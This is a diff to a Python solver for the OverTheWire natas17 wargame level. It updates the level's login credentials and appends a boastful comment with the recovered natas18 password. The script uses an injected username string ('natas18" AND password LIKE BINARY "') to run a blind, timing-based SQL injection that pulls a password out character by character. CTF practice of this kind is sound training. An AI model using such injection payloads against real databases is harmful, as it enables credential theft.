@@ -52,8 +52,17 @@ def main():
 
 
 url = 'http://natas17.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
+lvl_pass = requests.auth.HTTPBasicAuth('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd')
 un_base = 'natas18" AND password LIKE BINARY "'
 
 pw = ""
 main()
+'''
+They told me it couldn't be done. And we're going to keep on winning. 
+Yes, we can TIME our SQL injection attacks! We are unstoppable!
+
+
+Username: natas18
+Password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+'''
